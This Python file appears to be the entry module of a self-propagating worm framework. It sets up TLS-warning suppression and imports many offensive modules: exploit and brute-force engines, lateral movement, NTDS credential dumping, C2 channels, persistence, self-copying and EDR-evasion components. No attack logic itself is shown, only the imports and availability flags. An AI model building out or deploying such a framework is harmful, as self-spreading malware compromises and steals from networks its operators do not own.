import sys
import time

if sys.stdout.encoding.lower() != "utf-8":
    sys.stdout.reconfigure(encoding="utf-8")

import asyncio
import json
import os
import shlex
import threading
import traceback
import warnings
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple

import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings("ignore", message="Unverified HTTPS request")

PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.append(PROJECT_ROOT)

from configs.config import Config
from rl_engine import PropagationAgent, RealWorldPropagationAgent

from scanner import HostClassifier, IntelligentScanner
from utils.logger import logger

WORM_FILE_PATH = os.path.abspath(__file__)

try:
    from exploits.contextual_bandit import ContextualBandit
    CONTEXTUAL_BANDIT_AVAILABLE = True
except ImportError:
    CONTEXTUAL_BANDIT_AVAILABLE = False
    ContextualBandit = None

try:
    from evasion.evasion_model import EvasionModel
    EVASION_MODEL_AVAILABLE = True
except ImportError:
    EVASION_MODEL_AVAILABLE = False
    EvasionModel = None

try:
    from scanner.professional_scanner import ProfessionalScanner, ServiceDetector
    PRO_SCANNER_AVAILABLE = True
except ImportError:
    PRO_SCANNER_AVAILABLE = False
    ProfessionalScanner = None
    ServiceDetector = None

try:
    from exploits.brute_force_engine import BruteForceEngine, PasswordGenerator
    BRUTE_FORCE_AVAILABLE = True
except ImportError:
    BRUTE_FORCE_AVAILABLE = False
    BruteForceEngine = None
    PasswordGenerator = None

try:
    from exploits.exploit_engine import ExploitChain, VulnerabilityScanner
    EXPLOIT_ENGINE_AVAILABLE = True
except ImportError:
    EXPLOIT_ENGINE_AVAILABLE = False
    VulnerabilityScanner = None
    ExploitChain = None

try:
    from exploits.async_exploit import AsyncExploitDispatcher
    ASYNC_EXPLOIT_AVAILABLE = True
except ImportError:
    ASYNC_EXPLOIT_AVAILABLE = False
    AsyncExploitDispatcher = None

try:
    from core.knowledge_graph import NetworkKnowledgeGraph
    KNOWLEDGE_GRAPH_AVAILABLE = True
except ImportError:
    KNOWLEDGE_GRAPH_AVAILABLE = False
    NetworkKnowledgeGraph = None

try:
    from post_exploit.lateral_movement import LateralMovementEngine
    LATERAL_MOVEMENT_AVAILABLE = True
except ImportError:
    LATERAL_MOVEMENT_AVAILABLE = False
    LateralMovementEngine = None

try:
    from evasion.polymorphic_engine import PolymorphicEngine
    POLYMORPHIC_AVAILABLE = True
except ImportError:
    POLYMORPHIC_AVAILABLE = False
    PolymorphicEngine = None

try:
    from utils.audit_report import AuditReportGenerator
    AUDIT_REPORT_AVAILABLE = True
except ImportError:
    AUDIT_REPORT_AVAILABLE = False
    AuditReportGenerator = None

try:
    from monitoring.cli_monitor import CLIMonitor, WormActivityBridge
    CLI_MONITOR_AVAILABLE = True
except ImportError:
    CLI_MONITOR_AVAILABLE = False
    CLIMonitor = None
    WormActivityBridge = None

try:
    from c2.multi_protocol_c2 import MultiProtocolC2
    C2_AVAILABLE = True
except ImportError:
    C2_AVAILABLE = False
    MultiProtocolC2 = None

try:
    from monitoring.host_monitor import HostMonitor, HostState
    HOST_MONITOR_AVAILABLE = True
except ImportError:
    HOST_MONITOR_AVAILABLE = False
    HostMonitor = None
    HostState = None

try:
    from core.predictive_recon import BayesianNetworkAnalyzer, PredictiveScanner
    PREDICTIVE_RECON_AVAILABLE = True
except ImportError:
    PREDICTIVE_RECON_AVAILABLE = False
    PredictiveScanner = None
    BayesianNetworkAnalyzer = None

try:
    from exploits.adaptive_exploit_selector import AdaptiveExploitSelector
    ADAPTIVE_EXPLOIT_AVAILABLE = True
except ImportError:
    ADAPTIVE_EXPLOIT_AVAILABLE = False
    AdaptiveExploitSelector = None

try:
    from core.distributed_redundancy import DistributedRedundancy
    DISTRIBUTED_REDUNDANCY_AVAILABLE = True
except ImportError:
    DISTRIBUTED_REDUNDANCY_AVAILABLE = False
    DistributedRedundancy = None

try:
    from evasion.traffic_mimicry import TrafficMimicryEngine
    TRAFFIC_MIMICRY_AVAILABLE = True
except ImportError:
    TRAFFIC_MIMICRY_AVAILABLE = False
    TrafficMimicryEngine = None

try:
    from evasion.semantic_polymorphism import SemanticPolymorphicEngine
    SEMANTIC_POLYMORPHISM_AVAILABLE = True
except ImportError:
    SEMANTIC_POLYMORPHISM_AVAILABLE = False
    SemanticPolymorphicEngine = None

try:
    from core.dormant_cells import DormantCellManager
    DORMANT_CELLS_AVAILABLE = True
except ImportError:
    DORMANT_CELLS_AVAILABLE = False
    DormantCellManager = None

try:
    from core.wave_propagation import SelfCopyTransfer
    SELF_COPY_AVAILABLE = True
except ImportError:
    SELF_COPY_AVAILABLE = False
    SelfCopyTransfer = None

try:
    from post_exploit.payload_deployer import PayloadDeployer
    PAYLOAD_DEPLOYER_AVAILABLE = True
except ImportError:
    PAYLOAD_DEPLOYER_AVAILABLE = False
    PayloadDeployer = None

try:
    from post_exploit.remote_persistence import PersistenceEngine
    REMOTE_PERSISTENCE_AVAILABLE = True
except ImportError:
    REMOTE_PERSISTENCE_AVAILABLE = False
    PersistenceEngine = None

try:
    from infection.enhanced_infection import InfectionEngine
    INFECTION_ENGINE_AVAILABLE = True
except ImportError:
    INFECTION_ENGINE_AVAILABLE = False
    InfectionEngine = None

try:
    from c2.cloud_c2 import CloudC2Manager
    CLOUD_C2_AVAILABLE = True
except ImportError:
    CLOUD_C2_AVAILABLE = False
    CloudC2Manager = None

try:
    from post_exploit.dcom_lateral import DCOMLateral
    DCOM_LATERAL_AVAILABLE = True
except ImportError:
    DCOM_LATERAL_AVAILABLE = False
    DCOMLateral = None

try:
    from post_exploit.vss_ntds import VSSNTDSExtractor
    VSS_NTDS_AVAILABLE = True
except ImportError:
    VSS_NTDS_AVAILABLE = False
    VSSNTDSExtractor = None

try:
    from evasion.ja3_spoof import JA3Spoofer
    JA3_SPOOF_AVAILABLE = True
except ImportError:
    JA3_SPOOF_AVAILABLE = False
    JA3Spoofer = None

try:
    from c2.icmp_tunnel import ICMPTunnel
    ICMP_TUNNEL_AVAILABLE = True
except ImportError:
    ICMP_TUNNEL_AVAILABLE = False
    ICMPTunnel = None

try:
    from evasion.direct_syscalls import DirectSyscalls
    DIRECT_SYSCALLS_AVAILABLE = True
except ImportError:
    DIRECT_SYSCALLS_AVAILABLE = False
    DirectSyscalls = None

try:
    from evasion.sleep_obfuscation import SleepObfuscator
    SLEEP_OBFUSCATOR_AVAILABLE = True
except ImportError:
    SLEEP_OBFUSCATOR_AVAILABLE = False
    SleepObfuscator = None

try:
    from monitoring.multi_operator import MultiOperatorServer
    MULTI_OPERATOR_AVAILABLE = True
except ImportError:
    MULTI_OPERATOR_AVAILABLE = False
    MultiOperatorServer = None

try:
    from utils.mitre_mapper import MITREMapper
    MITRE_MAPPER_AVAILABLE = True
except ImportError:
    MITRE_MAPPER_AVAILABLE = False
    MITREMapper = None

try:
    from core.plugin_system import PluginManager
    PLUGIN_SYSTEM_AVAILABLE = True
except ImportError:
    PLUGIN_SYSTEM_AVAILABLE = False
    PluginManager = None

try:
    from post_exploit.local_persistence import AdvancedPersistence, PersistenceManager
    LOCAL_PERSISTENCE_AVAILABLE = True
except ImportError:
    LOCAL_PERSISTENCE_AVAILABLE = False
    PersistenceManager = None
    AdvancedPersistence = None

try:
    from core.adaptive_cycle import AdaptiveCycle
    ADAPTIVE_CYCLE_AVAILABLE = True
except ImportError:
    ADAPTIVE_CYCLE_AVAILABLE = False
    AdaptiveCycle = None

try:
    from swarm.multi_agent import SwarmAgent, SwarmCoordinator
    SWARM_AVAILABLE = True
except ImportError:
    SWARM_AVAILABLE = False
    SwarmCoordinator = None
    SwarmAgent = None

try:
    from payloads.payload_manager import PayloadManager
    PAYLOAD_MANAGER_AVAILABLE = True
except ImportError:
    PAYLOAD_MANAGER_AVAILABLE = False
    PayloadManager = None

try:
    from exploits.fuzzing_engine import FuzzingEngine
    FUZZING_ENGINE_AVAILABLE = True
except ImportError:
    FUZZING_ENGINE_AVAILABLE = False
    FuzzingEngine = None

try:
    from c2.pfs_crypto import PFSCrypto
    PFS_CRYPTO_AVAILABLE = True
except ImportError:
    PFS_CRYPTO_AVAILABLE = False
    PFSCrypto = None
